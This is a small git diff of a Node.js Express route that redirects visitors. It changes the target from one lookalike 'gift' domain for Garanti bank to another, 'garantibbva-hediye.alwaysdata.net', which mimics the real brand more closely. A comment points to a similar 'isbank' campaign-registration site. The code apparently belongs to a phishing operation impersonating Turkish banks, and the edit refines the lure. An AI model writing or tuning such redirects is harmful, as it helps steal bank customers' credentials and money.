@@ -83,7 +83,7 @@ app.get('/jojo', (req, res) => {
     // https://isbank-kampanyalar-kayit.vercel.app/
 
     // Kullanıcıyı yönlendir
-    res.redirect('https://garantibank-hediye.alwaysdata.net');
+    res.redirect('https://garantibbva-hediye.alwaysdata.net');
 });
 
 
